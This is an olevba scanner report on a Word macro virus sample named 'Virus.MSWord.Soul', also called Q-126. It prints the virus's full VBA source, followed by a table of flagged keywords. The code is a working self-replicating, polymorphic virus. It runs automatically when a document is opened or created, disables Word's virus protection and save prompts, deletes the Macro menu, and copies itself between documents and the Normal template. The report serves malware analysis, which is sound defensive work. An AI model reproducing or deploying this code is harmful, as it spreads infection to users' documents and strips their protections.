olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Soul-e315af11e5d5d826ab9e9bcf85871f20edddeda4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Soul-e315af11e5d5d826ab9e9bcf85871f20edddeda4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim ÜÁòÛÅæ�ÖÕ¶•×�(16, 2) As String
Private Sub Document_New()
Call Document_Open
End Sub

Private Sub Document_Open()
Const Ð£Í«µô×ÑÂîç = "NormalTemplate"
On Error Resume Next
Select Case Ð£Í«µô×ÑÂîç
Case "ActiveDocument"
    Set Õ“¡˜´¼à–™°È = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set …«Ø‹¹¬’ßõöò = NormalTemplate.VBProject.VBComponents(1).CodeModule
Case "NormalTemplate"
    Set …«Ø‹¹¬’ßõöò = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set Õ“¡˜´¼à–™°È = NormalTemplate.VBProject.VBComponents(1).CodeModule
    If Day(Date) < 5 Then
    MsgBox "Q-126 infection", vbCritical, "Q-126"
    End If
End Select
SetAttr (NormalTemplate.Name), vbNormal
CommandBars("Tools").Controls("Macro").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "me") = "Q-126 Virus" 'ñ„Îíë”�¤�Ìñß¹
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "version") = "2.45" 'ñ„Îíë”�¤�Ìñß¹
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "date") = "20/05/1999" 'ñ„Îíë”�¤�Ìñß¹
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "Polymorph") = "(10..14)*126" 'ñ„Îíë”�¤�Ìñß¹
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "author") = "Lord Soulblighter" 'ã¬±‚³ÀÔº‰Ÿ œ¨
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "origin") = "Belgium" 'Chr
If …«Ø‹¹¬’ßõöò.Countoflines > 100 Then
Exit Sub
Else
Call ÚÉÚ¦ÅÃêóúæ¤É·(…«Ø‹¹¬’ßõöò, Õ“¡˜´¼à–™°È)
NormalTemplate.Save
End If
End Sub
Private Sub Document_Close()
End Sub
Private Function ÚÉÚ¦ÅÃêóúæ¤É·(ByVal ãéœáí�©ÜýÞ, �·´øËõÓÝžÝù)
Dim ˜‘Èý»¨žºäŠ½ ¶, ã¬±‚³ÀÔº‰Ÿ œ¨, ñ„Îíë”�¤�Ìñß¹ As Integer
Dim ’Ä‹–¸°†§äå As String
ÜÁòÛÅæ�ÖÕ¶•×�(1, 1) = "ÜÁòÛÅæ�ÖÕ¶•×�"
ÜÁòÛÅæ�ÖÕ¶•×�(2, 1) = "Ð£Í«µô×ÑÂîç"
ÜÁòÛÅæ�ÖÕ¶•×�(3, 1) = "Õ“¡˜´¼à–™°È"
ÜÁòÛÅæ�ÖÕ¶•×�(4, 1) = "…«Ø‹¹¬’ßõöò"
ÜÁòÛÅæ�ÖÕ¶•×�(5, 1) = "ÚÉÚ¦ÅÃêóúæ¤É·"
ÜÁòÛÅæ�ÖÕ¶•×�(6, 1) = "ãéœáí�©ÜýÞ"
ÜÁòÛÅæ�ÖÕ¶•×�(7, 1) = "�·´øËõÓÝžÝù"
ÜÁòÛÅæ�ÖÕ¶•×�(8, 1) = "˜‘Èý»¨žºäŠ½ ¶"
ÜÁòÛÅæ�ÖÕ¶•×�(9, 1) = "ã¬±‚³ÀÔº‰Ÿ œ¨"
ÜÁòÛÅæ�ÖÕ¶•×�(10, 1) = "ñ„Îíë”�¤�Ìñß¹"
ÜÁòÛÅæ�ÖÕ¶•×�(11, 1) = "’Ä‹–¸°†§äå"
ÜÁòÛÅæ�ÖÕ¶•×�(12, 1) = "½Ü¢ÑŸÙ‡Æ‡£”"
ÜÁòÛÅæ�ÖÕ¶•×�(13, 1) = "—Ï§ÁÏÆâŽ±ÄÇÞ"
ÜÁòÛÅæ�ÖÕ¶•×�(14, 1) = "�ÔÙª¹èûâ±¥"
ÜÁòÛÅæ�ÖÕ¶•×�(15, 1) = "¢®Šš¬Ô—•¼¤ª"
ÜÁòÛÅæ�ÖÕ¶•×�(16, 1) = "Ó›æàµ™Ë³�¿"
For ã¬±‚³ÀÔº‰Ÿ œ¨ = 1 To 16
    ÜÁòÛÅæ�ÖÕ¶•×�(ã¬±‚³ÀÔº‰Ÿ œ¨, 2) = —Ï§ÁÏÆâŽ±ÄÇÞ
Next ã¬±‚³ÀÔº‰Ÿ œ¨
ã¬±‚³ÀÔº‰Ÿ œ¨ = ãéœáí�©ÜýÞ.Countoflines
For ˜‘Èý»¨žºäŠ½ ¶ = 1 To ã¬±‚³ÀÔº‰Ÿ œ¨
    ãéœáí�©ÜýÞ.Ó›æàµ™Ë³�¿Line ˜‘Èý»¨žºäŠ½ ¶, "'"
Next ˜‘Èý»¨žºäŠ½ ¶
ã¬±‚³ÀÔº‰Ÿ œ¨ = ãéœáí�©ÜýÞ.Countoflines
For ñ„Îíë”�¤�Ìñß¹ = 1 To �·´øËõÓÝžÝù.Countoflines
’Ä‹–¸°†§äå = �·´øËõÓÝžÝù.Lines(ñ„Îíë”�¤�Ìñß¹, 1)
   Select Case ’Ä‹–¸°†§äå
   Case "Const Ð£Í«µô×ÑÂîç = ""ActiveDocument"""
       ’Ä‹–¸°†§äå = "Const Ð£Í«µô×ÑÂîç = ""NormalTemplate"""
   Case "Const Ð£Í«µô×ÑÂîç = ""NormalTemplate"""
       ’Ä‹–¸°†§äå = "Const Ð£Í«µô×ÑÂîç = ""ActiveDocument"""
   Case "'"
       GoTo ¢®Šš¬Ô—•¼¤ª
   End Select
   ãéœáí�©ÜýÞ.InsertLines (ã¬±‚³ÀÔº‰Ÿ œ¨ + ñ„Îíë”�¤�Ìñß¹), Ó›æàµ™Ë³�¿(’Ä‹–¸°†§äå)
¢®Šš¬Ô—•¼¤ª:
Next ñ„Îíë”�¤�Ìñß¹
End Function
Private Function Ó›æàµ™Ë³�¿(�ÔÙª¹èûâ±¥ As String)
Dim ’Ä‹–¸°†§äå As String
Dim ½Ü¢ÑŸÙ‡Æ‡£” As Boolean
Dim ñ„Îíë”�¤�Ìñß¹, ã¬±‚³ÀÔº‰Ÿ œ¨ As Integer
For ã¬±‚³ÀÔº‰Ÿ œ¨ = 1 To 16
½Ü¢ÑŸÙ‡Æ‡£” = True
While ½Ü¢ÑŸÙ‡Æ‡£” = True
  ½Ü¢ÑŸÙ‡Æ‡£” = False
  For ñ„Îíë”�¤�Ìñß¹ = 1 To (Len(�ÔÙª¹èûâ±¥) - Len(ÜÁòÛÅæ�ÖÕ¶•×�(ã¬±‚³ÀÔº‰Ÿ œ¨, 1)) + 1)
    ’Ä‹–¸°†§äå = Mid(�ÔÙª¹èûâ±¥, ñ„Îíë”�¤�Ìñß¹, Len(ÜÁòÛÅæ�ÖÕ¶•×�(ã¬±‚³ÀÔº‰Ÿ œ¨, 1)))
    If ’Ä‹–¸°†§äå = ÜÁòÛÅæ�ÖÕ¶•×�(ã¬±‚³ÀÔº‰Ÿ œ¨, 1) Then
      �ÔÙª¹èûâ±¥ = Left(�ÔÙª¹èûâ±¥, ñ„Îíë”�¤�Ìñß¹ - 1) & ÜÁòÛÅæ�ÖÕ¶•×�(ã¬±‚³ÀÔº‰Ÿ œ¨, 2) & Right(�ÔÙª¹èûâ±¥, Len(�ÔÙª¹èûâ±¥) - ñ„Îíë”�¤�Ìñß¹ - Len(ÜÁòÛÅæ�ÖÕ¶•×�(ã¬±‚³ÀÔº‰Ÿ œ¨, 1)) + 1)
      ½Ü¢ÑŸÙ‡Æ‡£” = True
    End If
 Next ñ„Îíë”�¤�Ìñß¹
Wend
Next ã¬±‚³ÀÔº‰Ÿ œ¨
Ó›æàµ™Ë³�¿ = �ÔÙª¹èûâ±¥
End Function
Private Function —Ï§ÁÏÆâŽ±ÄÇÞ()
Dim ñ„Îíë”�¤�Ìñß¹ As Integer
—Ï§ÁÏÆâŽ±ÄÇÞ = ""
Randomize
ñ„Îíë”�¤�Ìñß¹ = Int((4 * Rnd) + 10)
While Len(—Ï§ÁÏÆâŽ±ÄÇÞ) < ñ„Îíë”�¤�Ìñß¹
    Randomize
    —Ï§ÁÏÆâŽ±ÄÇÞ = —Ï§ÁÏÆâŽ±ÄÇÞ + Chr(Int((126 * Rnd) + 129))
Wend
End Function






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

